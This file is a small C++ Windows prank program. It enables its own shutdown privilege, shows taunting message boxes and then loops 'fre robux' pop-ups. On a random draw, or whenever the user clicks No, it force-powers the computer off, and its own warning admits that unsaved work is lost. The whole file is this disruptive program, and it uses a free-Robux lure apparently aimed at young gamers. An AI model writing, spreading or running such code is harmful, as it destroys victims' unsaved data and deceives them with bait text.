#include <windows.h>
#include <iostream>
#include <string>
#include <cstdlib>
using namespace std;
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    return 0;
}



LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    return 0;
}
int main()
{
    HANDLE hToken; 
    TOKEN_PRIVILEGES tkp; 
    if (!OpenProcessToken(GetCurrentProcess(), 
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) 
       return( FALSE );
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, 
        &tkp.Privileges[0].Luid); 
 
    tkp.PrivilegeCount = 1;  // one privilege to set    
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, 
        (PTOKEN_PRIVILEGES)NULL, 0); 
 
    if (GetLastError() != ERROR_SUCCESS) 
      return FALSE; 
    int i = 0;
    MessageBoxA(NULL, "sub to morganpog now or u die", "hahahahahahahahasashahshahsahshahsdjhagdhsagdhjgsaghdjhgsahdgjsa", 0x00000030L);
    MessageBoxA(NULL, "pls save stuff, if u hit ok u might lose all stuff not saved as pc go die sometimes", "wraning", 0x00000030L);
    while (1==1)
    {
        FreeConsole();
        i++;
        int random_integer = 1 + rand() % 10;
        std::string  txt = "fre robux: ";
        txt += std::to_string(i);
        if (random_integer==10)
        {
            ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
            MessageBoxA(NULL,"bye bye", "bruh u lose", 0x00000014L);
        }
        int a = MessageBoxA(NULL, txt.c_str(), "if u press no pc die bye bye", 0x00000014L);
        if (a==7)
        {
              ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION);
        }
    } 
}